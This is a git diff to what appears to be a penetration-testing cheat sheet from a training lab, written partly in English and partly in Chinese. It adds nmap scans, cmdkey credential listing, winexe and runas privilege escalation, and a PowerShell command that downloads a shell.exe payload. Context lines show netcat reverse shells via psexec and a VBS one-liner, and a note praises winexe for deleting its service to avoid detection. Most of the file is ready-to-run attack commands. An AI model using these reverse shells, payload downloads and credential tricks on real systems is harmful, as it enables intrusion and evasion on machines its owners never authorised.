@@ -29,6 +29,14 @@
 ```
 $ nmap ip --top-ports 1000 --open -sV
 ```
+* speed up
+```
+$ nmap ip -SU --min-rate 5000
+```
+* UDP
+```
+$ nmap -sU --min-rate 5000 ip
+```
 * smb vulnerable
 ```
 $ nmap -v -p 139, 445 --script="smb-vuln-*,samba-vuln-*" 10.11.1.1-254
@@ -213,10 +221,23 @@ $ tasklist
 ```
 $ dir /a
 ```
+* show default creds
+```
+$ cmdkey /list
+```
+
 #### Priv Esc
 * psexec
 ```
 $ psexec -u alice -p aliceishere "c:\Users\Public\nc.exe" 10.11.0.49 5555 -e cmd.exe
+```
+* winexe
+```
+$ winexe -U username%password //ip cmd.exe
+```
+* runas
+```
+$ runas /savecred /user:Administrator shell.exe
 ```
 ### BufferOverflow
 ## connect to Windows
@@ -305,3 +326,22 @@ DOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=No
 thing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vb
 s&@echo objShell.Exec("nc.exe -e cmd.exe 10.11.0.186 4444")>>poc.vbs&cscript.exe poc.vbs"
 ```
+## powershell download file
+```
+$ powershell -c (new-object System.Net.WebClient).DownloadFile('http://IP/shell.exe','C:\Users\security\shell.exe')
+```
+### Notes
+## strck in get user
+- enumerate more
+    - UDP
+## SNMP
+- 簡單網路管理協議
+- 監測連接到網絡上的設備是否有任何引起管理上關注的情況
+- 每一個被管理的系統上有運行一個叫做代理者（agent）的軟體元件，且透過SNMP對管理系統報告資訊
+- 代理者是一種存在於被管理的設備中的網路管理軟體模組。代理者控制本地機器的管理資訊，以和SNMP相容的格式傳送這項資訊
+## upgrading to meterpreter
+- https://www.hackingtutorials.org/networking/upgrading-netcat-shells-to-meterpreter/
+## winexe
+- 對方主機開啟文件共享服務時
+- 藉助Winexe工具遠程執行Windows命令
+- 該工具首先會在目標主機安裝對應的Winexe服務，然後執行指定的命令。執行完成後，該工具會自動刪除對應的服務，以避免被發現
